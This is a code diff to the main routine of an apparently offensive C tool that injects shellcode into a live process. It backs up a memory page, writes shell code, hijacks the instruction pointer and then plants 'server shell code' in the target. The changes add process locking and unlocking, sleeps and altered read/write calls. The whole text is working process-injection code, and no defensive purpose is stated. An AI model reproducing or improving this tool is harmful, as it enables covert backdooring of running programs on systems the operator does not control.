@@ -435,6 +435,12 @@ main(int argc, char *argv[])
 			break;
 	}
 
+	res = prc_lock(pid);
+	if (res < 0) {
+		printf("failed to initialize the process handler, res: %i\n", res);
+		exit(EXIT_FAILURE);
+	}
+
 	struct user_regs_struct regs_bkp;
 	res = vm_regs_get(pid, &regs_bkp);
 	if (res < 0) {
@@ -451,13 +457,13 @@ main(int argc, char *argv[])
 	char shl_bkp_prot;
 	shl_bkp_prot = mm_entry->prot;
 
-	res = vm_read(pid, sizeof (shl_bkp), shl_bkp, mm_entry->start, mm_entry->prot);
+	res = vm_read(pid, sizeof (shl_bkp), shl_bkp, mm_entry->start);
 	if (res < 0) {
 		printf("failed to read the remote page, res: %i\n", res);
 		exit(EXIT_FAILURE);
 	}
 
-	res = vm_write(pid, sizeof (shl_mem), shl_mem, mm_entry->start, mm_entry->prot);
+	res = vm_write(pid, sizeof (shl_mem), shl_mem, mm_entry->start);
 	if (res < 0) {
 		printf("failed to write the shell code at %p, prot: %02x, res: %i\n", 
 			mm_entry->start, mm_entry->prot, res);
@@ -473,6 +479,21 @@ main(int argc, char *argv[])
 	res = vm_regs_set(pid, &regs);
 	if (res < 0) {
 		printf("failed to change the instruction pointer, res: %i\n", res);
+		exit(EXIT_FAILURE);
+	}
+
+	res = prc_unlock(pid);
+	if (res < 0) {
+		printf("failed to continue the process, res: %i\n", res);
+		exit(EXIT_FAILURE);
+	}
+
+	sleep(2);
+
+	// NOTE: a very bad way of restarting to refresh the memory map
+	res = prc_lock(pid);
+	if (res < 0) {
+		printf("failed to initialize the process handler, res: %i\n", res);
 		exit(EXIT_FAILURE);
 	}
 
@@ -493,7 +514,7 @@ main(int argc, char *argv[])
 				
 				char sig_buf[sizeof (sig_str) - 1];
 				bzero(sig_buf, sizeof (sig_buf));
-				res = vm_read(pid, sizeof (sig_buf), sig_buf, mm_entry->start, mm_entry->prot);
+				res = vm_read(pid, sizeof (sig_buf), sig_buf, mm_entry->start);
 				if (res < 0) {
 					printf("failed to read the remote page, res: %i\n", res);
 					exit(EXIT_FAILURE);
@@ -509,14 +530,16 @@ main(int argc, char *argv[])
 		sleep(1);
 	}
 
-	res = vm_write(pid, sizeof (shl_bkp), shl_bkp, shl_bkp_addr, shl_bkp_prot);
+	sleep(2);
+	
+	res = vm_write(pid, sizeof (shl_bkp), shl_bkp, shl_bkp_addr);
 	if (res < 0) {
 		printf("failed to write the mem shell backup at %p, prot: %02x, res: %i\n", 
 			shl_bkp_addr, shl_bkp_prot, res);
 		exit(EXIT_FAILURE);
 	}
 
-	res = vm_write(pid, sizeof (shl_srv), shl_srv, mm_entry->start, mm_entry->prot);
+	res = vm_write(pid, sizeof (shl_srv), shl_srv, mm_entry->start);
 	if (res < 0) {
 		printf("failed to write the server shell code at %p, prot: %02x, res: %i\n", 
 			mm_entry->start, mm_entry->prot, res);
@@ -529,13 +552,14 @@ main(int argc, char *argv[])
 		exit(EXIT_FAILURE);
 	}
 
-	regs.rip = (unsigned long long int)mm_entry->start + sizeof (inst_syscall);
+	regs.rip = (unsigned long long)mm_entry->start + sizeof (inst_syscall);
 	res = vm_regs_set(pid, &regs);
 	if (res < 0) {
 		printf("failed to change the instruction pointer, res: %i\n", res);
 		exit(EXIT_FAILURE);
 	}
 
+	prc_unlock(pid);
 	mm_list_del(&mm_list);
 	return EXIT_SUCCESS;
 }
